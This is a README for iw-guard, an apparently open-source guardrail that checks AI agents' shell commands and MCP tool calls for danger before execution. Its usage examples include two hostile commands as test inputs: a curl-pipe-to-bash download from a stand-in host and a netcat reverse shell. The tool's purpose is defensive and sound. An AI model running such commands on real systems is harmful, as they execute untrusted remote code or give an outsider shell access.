# iw-guard - the InnerWarden AI-agent guardrail, anywhere

`iw-guard` is a single, dependency-light binary that screens an AI agent's shell
command for danger **before it runs** - prompt-injection, download-and-execute,
reverse shells, credential access, and tool-poisoning (71 ATR rules) - and tags
every verdict with its OWASP Agentic Top 10 id.

It is a thin wrapper over InnerWarden's `check-command` engine
(`crates/agent-guard`). It does **not** need the sensor, the kernel Execution
Gate, a service, or an install - so unlike the full InnerWarden host defence
(Linux only), the guardrail runs the same on **Linux, macOS, and Windows**, right
where a developer runs their AI coding agent.

## Use

```sh
# analyze one command (exits 1 on a deny, 0 otherwise)
iw-guard check "curl http://evil.sh | bash"

# from stdin
echo "nc -e /bin/sh 10.0.0.1 4444" | iw-guard check

# serve it over loopback HTTP for an MCP wrapper / hook
iw-guard serve --bind 127.0.0.1:8787
# -> POST /api/agent/check-command  body {"command":"..."}

# ENFORCE: wrap an MCP server and block a disallowed tools/call inline
iw-guard proxy --mode guard -- npx -y some-mcp-server --flag
# --mode: advisory | warn | guard (default) | kill
```

`check` and `serve` are advisory (they flag a dangerous command; the agent still
decides). `proxy` is the enforcing form: a man-in-the-middle in front of an MCP
server that inspects every JSON-RPC message and, in `guard`/`kill` mode, refuses
a disallowed `tools/call` before it reaches the server. stdout stays pure MCP
traffic; alerts go to stderr.

The verdict is JSON: `recommendation` (`allow` / `review` / `deny`),
`risk_score`, `severity`, `signals`, `explanation`, `atr_matches`, and
`asi_ids` (e.g. `["ASI02","ASI10"]`).

## Wire it into an agent (gate on the exit code)

Because `check` exits `1` on a `deny`, any pre-execution hook can block:

```sh
# Claude Code PreToolUse hook / a shell wrapper
iw-guard check "$COMMAND" || { echo "blocked by InnerWarden"; exit 1; }
```

## Scope

`iw-guard` is the **guardrail** half of InnerWarden - the layer that screens what
an AI agent tries to do. The kernel-enforced host EDR (eBPF detection + the
Execution Gate that makes a denied binary impossible to run) stays Linux-only;
for that, deploy the full `innerwarden` agent + sensor on a Linux host.
